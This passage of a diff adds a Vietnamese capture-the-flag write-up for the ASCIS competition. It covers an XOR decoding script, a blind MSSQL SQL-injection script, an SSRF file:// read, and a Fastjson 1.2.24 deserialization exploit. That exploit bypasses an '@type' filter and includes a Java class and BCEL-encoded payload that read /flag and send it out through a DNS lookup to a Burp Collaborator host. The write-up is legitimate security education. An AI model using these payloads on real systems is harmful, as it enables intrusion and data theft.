AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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...")
+
+r = ''
+for i in range(len(a)):
+    r += chr(ord(a[i]) ^ ord(b[i % len(b)]))
+
+open('flag.png', 'wb').write(r)
+``` 
+Kết quả thu được 1 cái hình như này
+
+![final](https://user-images.githubusercontent.com/41907864/137724646-ca8e73dd-8edd-4436-ad87-08e6e02bfd53.png)
+
+Sau khi giải ra bài này, mình đã căng mắt ra để submit flag nhưng mà vẫn bị sai, đội mình quyết định hỏi BTC thì sau đó BTC đã sửa lại flag trên web ctfd.
+
+> Flag: ASCIS{H1!_1_4m_p0w3r_Gh057}
+
+# Web   
+
+## script kiddie - 100pts  
+  
+Như mô tả ta có thể biết rằng web có chứa lỗ hổng SQL-injection với cơ sở dữ liệu được dùng ở đây là MSSQL.  
+Câu query như sau: ` SELECT * FROM ... ORDER BY $sort ASC`  
+Giá trị của biến `$sort` ta có thể control thông qua param `?sort=`  
+Payload: `(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end )`  
+  
+```python3  
+import requests
+from string import printable
+
+
+url = 'http://167.172.85.253/web100/'
+r = requests.Session()
+db = ''
+index = len(db) + 1
+
+while True:
+	for c in printable:
+		#print("testing for " + c)
+		payload = f'(case when (ascii(substring(db_name(),{index},1))={ord(c)}) then 1 else 1/db_name() end)'
+		resp = r.get(url + '?sort=' + payload)
+		if "Error" not in resp.text:
+			db += c
+			index += 1
+			print(f"Length: {len(db)} - DB_NAME: {db}")
+			break  
+```  
+![image](https://user-images.githubusercontent.com/44127534/137701975-53123d34-8aa2-4aa5-a045-d4bb27ac934d.png)  
+> Flag: `ASICS{ssalchtiwesmihcueymorf}`  
+
+## OProxy - 400pts
+  
+Challege là một trang web có chức năng cho người dùng nhập vào một url và server trả về nội dung của trang web đó.  
+![1](https://user-images.githubusercontent.com/44127534/137702153-809ef500-a4e6-49fa-b83e-4df111c5c777.png)
+  
+Dự đoán đây có thể tác giả ra thử thách ssrf. Fuzz các payload ssrf thì thấy được:  
+![2](https://user-images.githubusercontent.com/44127534/137702202-a82f0e56-e27d-4629-a829-de987f526274.png)
+  
+Để ý server respose header Werkzeug/1.01 Python/3.10.0, có thể dự đoán được back-end có thể là flask, và có thể challenge được dựng trên docker, thử nhập url: file://127.0.0.1/app/main.py thì có được mã nguồn:  
+  
+![3](https://user-images.githubusercontent.com/44127534/137702301-c120d7c0-0606-44ab-8ab1-590538b0dd33.png)
+  
+Tới đây thì thử đọc file flag:  
+![4](https://user-images.githubusercontent.com/44127534/137702338-414b7486-4fa5-4cf3-8864-4121a2d92ccc.png)
+  
+> Flag: `ASCIS{SSRF_M3mcached_inj3cti0n}`  
+
+## isolate - 475 pts  
+  
+Ở challenge này, đề bài có cung cấp cho ta source, cụ thể là có file `isolate.war` nên ta tiến hành giải nén và đọc các file `.class` bằng Intellij  
+Phần xử lý chính nằm ở class `ISOServlet` có nội dung sau:  
+![image](https://user-images.githubusercontent.com/44127534/137703459-7a027fbc-e3f4-4124-8c4a-09e50958d11e.png)
+  
+Server đọc chuỗi json qua `request.getInputStream()` và chặn những chuỗi json có chứa chuỗi `@type`, nếu mọi thứ ok thì sẽ đi qua hàm `JSON.parse(jsonData)`.  
+Ở đây challenge sử dụng `Fastjson` phiên bản `1.2.24`  
+![image](https://user-images.githubusercontent.com/44127534/137703786-2f6e1b65-3b82-46e0-9a5b-135325fe2989.png)  
+    
+Sau khi tìm google về `fastjson 1.2.24` thì thấy có khá nhiều bài nói về cách khai mà chủ yếu thông qua `autoType` do `fastjson` hỗ trợ được biểu diễn qua key là `@type`. Vì fastjson hỗ trợ việc sử dụng `autoType` này để khởi tạo một lớp cụ thể và gọi các phương thức set/get để truy cập các thuộc tính.  
+  
+Mà `@type` đã bị chặn bởi server vì do server lấy input dưới dạng stream nên ta có thể bypass dễ dàng qua unicode encode (cụ thể là `@\u0074ype`)  
+Sau khi được BTC hint `BCEL / DBCP` thì team đã nhanh chóng google tìm được một [bài post](http://blog.nsfocus.net/fastjson-basicdatasource-attack-chain-0521/) về nó và kết hợp với [bài github](https://github.com/depycode/fastjson-local-echo) là đủ dữ kiện để khai thác.  
+  
+![image](https://user-images.githubusercontent.com/44127534/137706394-c7bffeb2-b16c-410a-995c-3f4f7ba94f9c.png)
+  
+Payload:  
+```json
+{
+    {
+        "@\u0074ype": "com.alibaba.fastjson.JSONObject",
+        "x":{
+                "@\u0074ype": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@\u0074ype": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "<class dump>"
+        }
+    }: "x"
+}
+```  
+Trong đó, `<class dump>` là các file `.class` đã được encode dạng `BCELEncode`. Ý tưởng đọc flag ở `/flag` sau đó encode dưới dạng `hex` chèn vào `Burp collaborator client` như một domain, sau đó lắng nghe DNS lookup và lấy flag.  
+  
+```
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineManager;
+import javax.script.ScriptException;
+import java.io.DataInputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLConnection;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class Dummy {
+    static {
+        try {
+            getFlag();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
+
+    public static String byteArrayToHex(byte[] a) {
+        StringBuilder sb = new StringBuilder(a.length * 2);
+        for(byte b: a)
+            sb.append(String.format("%02x", b));
+        return sb.toString();
+    }
+
+    public static void leakFlag(String c) throws MalformedURLException {
+        URL yahoo = new URL("http://"+c+".648yq47p874in51d8874eiy2vt1jp8.burpcollaborator.net");
+        yahoo.hashCode();
+    }
+
+    public static void getFlag() throws Exception {
+        try {
+            byte[] dt = Files.readAllBytes(Paths.get("/flag"));
+            leakFlag(byteArrayToHex(dt));
+
+        } catch (MalformedURLException me) {
+            System.out.println("MalformedURLException: " + me);
+        } catch (IOException ioe) {
+            System.out.println("IOException: " + ioe);
+        }
+
+    }
+
+    public static void main(String[] args) {
+        try {
+            getFlag();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+```  
+Command:  
+```bash  
+> $ javac Dummy.java
+> $ java BCELEncode Dummy.class
+```   
+  
+Final payload:  
+```json
+{
+    {
+        "@\u0074ype": "com.alibaba.fastjson.JSONObject",
+        "x":{
+                "@\u0074ype": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@\u0074ype": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85U$dbV$dbF$U$dd$c26$SB$5cb$cc$r4$Q$924$d48$80$81$98K0$a55$E$g$8a$J$J$90$QJ$daT$b6$F6$91$zG$c8$U$f7$f6$d4$d5$P$e9$L$7d$y$edZ$e0$d5$ac$e4$D$fa$L$fd$91$3e5$dd$ps$c7Y$7d$f0$cc$e8$cc$cc$3e$fb$ec$d93$fe$eb$df$3f$df$C$88$e0G$V$3eDeL$a8$a8$c2$c7$K$se$7c$a2$e2S$c4T$5c$c1$94$IN$8b$e6$be$8c$Z$d1G$V$cc$w$f8L$85$8a$H$a2$99S$f0$b9$8cy$Vq$y$a8x$88E$V$b7$f0H4$8fe$y$d5$60$Z$x$K$9e$88$9dOU$ac$e2$99$8c5$F_$88$f9u$Z$cfUt$e2K$F_$89$5c$_j$Y$fcZ$86$$$a1$e6$c1$cc$b3$X$b1$a5$a5$d8$9a$84$aa$f5i$J$d5$T$99$5c$c6$99$94$e0$J$f6$3c$95$e0$9d$b6R$86$84$86x$sg$3c$yd$T$86$bd$a2$tLF$ea$TE$c7$88$d9$b6$5e$5c$b1$k$Y$bb$SZ$82$ebS$3d$f1$z$7dG$P$9bzn3$bc$ec$d8$99$dcfTB$dd$b2$a3$t_$$$e8yw$a7$8c$E$V$90$a0$98$86$fer$d6$d47$r4$H$_o$T$b9$d5$99$dd$a4$91w2Vn$5b$82$bci8b9Kea$q$96$d5397k$a5$cd$y$98$v$s$92$e6Q1$ea$b2U$b0$93$c6lFPW$ef$X$b2$d9b$bf$d8$a6$a1$h$lIh$bd$I1U$c8$98$v$c3$W$d3I$e6$ba$3d0$c4$K$hOW$z$s$b6$8c$a4$p$p$a5$c1$c0$86$86M$a45d$b0$a5$e1$rL$J$9a$bb2g8$e1$tKqrO$3bN$7e$3c$i$96$Q$e9$l$89$8c$V_EF$f3c$a3$91Lnx05$c6$81$91$v$O$ed8$83$5b$f9$b1$feD$c1$ce$t$z$d3$d4$T$96$ad$3b$96$ddO$Q$c1b$40C$W$ac$d7$X$dep5k$bc$c8X$86$a5$n$8fW2$c8z$h$dc$U$c2$j$Na$MH$e8$3c$a1$b3$a0$9b$h$96$9d5R$e4u$a2$ae$8c$82$86$j$7cC$j$w$ce$8fw$89$dave$U5$7c$x$f0$9a$5c$bc$8c$V$9e$5b$3cY$c4s$3e$f3$r$b6$M$Je$9bNy$9eLj$f8NL5$O$M$O$dd$8d$M$8f$8c$8e$dd$8bMM$df$9f$99$d5$f0$3d$7e$d0$f0$nn$b3N$f7$8c$84$t$a7$a8$7fpN$f8$a1$fe$Uk$8a$e6$a3$ae$3b$baY0$W7$98$sx$ce$7bb$9a$ce$ab$W$b5$e8$8e$84$7b$V$iv$d67$e5$e3$8cV$b4o$b5$9e$cf$h$b9$94$84$beJ6$bd$U$3ar$O7$w$8eU$OI$I$E$xB$xi$7d$3b$5d$be$60$bcms$c7j$e5$a8$ec$G$9d$g$7e$a4$3biZ$dfC$ebK$88$feO$N$e7$Z$9d$c3$88$5eB$W$X$81$c8$9am$e8$a9$98i$K$bd$f8$d9$W$ac$b4$b9G$i$c1Y$bf$V$b7$j$pKZV$81$b4$9a$e3$c7fx$c4$fc$OY$Yz6zA$ad$f7$ea$7b$aaVS$F$Y$9ep$5e$7c$99tWC$be$i$e7S$b2b$ebIJV$ebX$d3i$ddv$df$m$e1$91$9e$f5i$dc$e0$c3$e6$e3c$x$a1$5d$f8$88$a3j$8ey$c7$d9$G$f9$d5$c1$5eb$ef$L$jB$daw$X$f6$i$z$C$eaQ$p$$$cd$d1$d2$9f$Z$adf$l$7b$8d$aa$b5$d0$5b_$fa$Q$9exh$a1$f7$ed$a4g$c4$db$ec$ed$f8$F$b7$7b$9b$bdwG$7cw$fc$5e$ef$h$f8$d6$3c$cd$be$S$aa$97K$90$P$a0$ac$fe$e4$95$f6$de$fd$7d$e7$A5$bf$R$a4$caM$d3$e2rk$87$86$P$d0$85k$Ya$3fAN$bd$8c$b6$a2$ea$j$C$f0$c9$e8$93$d1$cfV$o$a5$7fH$bcF$dca$C$IN$b3$f0r$Et$bf$86$ba$sx$j$a2$d6$af1$5d$88$3f$7f$j$h$e6$3bD$7d$9cy$hVO$eb$ab$87$87$ed$N$s$bdIQna$90_$5e$ce$b5$Q$9d$d7$f4$I$fdW$ae$S$3a$y$fa$h$3dop$a5$E$7f$JM$f3$a1$S$C$r4$efa$7c$few$b4$k$tm$x$t$bd$ca$7c$Hh$dfC$c7$d9$c9k$e7$s$f7$5d$ca$BV$d8$e2$f6$RV$5d$d6$a3$9b$e9$c1$f4uL$l$40$3fW$84$d0$c6$D$Y$e48BU$86$d1$c7$ff$b9$BW$9fZxVe$dc$7d$$$pr$f5$84$7f$t$B$86$vc$f9$c4$e6$d8$8bTZ$J$j$7bP$84$I$d7$f7$dd$8a$3c$3c$c9$ces$87$Qal$94$d1a$c8$dc_$8b17$89$8c$aaY$Z$a3$5e$u$M$i$7b$e6$f1$91g$Ce$d8yVv$dd$dfu$80$h$7f$e0$e6$fb$e0$af0$W$60$d4O$c8$s$c2$b7$9e$87$e7$8b$e4$9ab$fc$3fag$V$f2$i$I$A$A"
+        }
+    }: "x"
+}
+```     
+![image](https://user-images.githubusercontent.com/44127534/137708160-5ce7139e-c0a2-402b-aed4-c3d44ae1e332.png)
+  
+![image](https://user-images.githubusercontent.com/44127534/137708257-373db6d0-4b61-4248-ac62-227c89dd9934.png)
+    
+> Flag: `ASCIS{howaboutw/oDNS?:>}`    
+
+
+
